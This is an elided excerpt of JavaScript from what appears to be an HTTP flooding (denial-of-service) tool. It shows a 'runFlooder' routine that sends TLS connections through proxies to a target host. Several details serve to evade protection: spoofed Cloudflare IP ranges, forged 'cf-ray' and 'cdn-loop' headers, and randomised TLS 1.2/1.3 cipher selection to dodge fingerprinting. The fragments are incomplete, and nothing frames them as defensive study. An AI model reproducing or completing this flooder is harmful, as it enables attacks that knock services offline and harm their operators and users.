...
const fakeIP = () => {
    const cfRanges = ['104.16', '104.17', '104.18', '104.19', '104.20', '104.21', '104.22', '104.24', '104.25', '104.26', '104.27', '104.28', '104.29', '104.30'];
    const prefix = randomElement(cfRanges);
...
const cplist = [...cplist_tls13, ...cplist_tls12];
...
function runFlooder() {
    ...
    let ZynosHeaders = {
      ...
      "cdn-loop": "Cloudflare",
      "cf-ray": crypto.randomBytes(8).toString('hex') + "-CGN",
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const useTLS13 = Math.random() < 0.5;
        const selectedCiphers = useTLS13 ? cplist_tls13 : cplist_tls12;
        const cipher = selectedCiphers[Math.floor(Math.random() * selectedCiphers.length)];
        ...
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            ...
            client.on("connect", () => {
                ...
                }, Math.floor(Math.random() * 1300) + 1800);
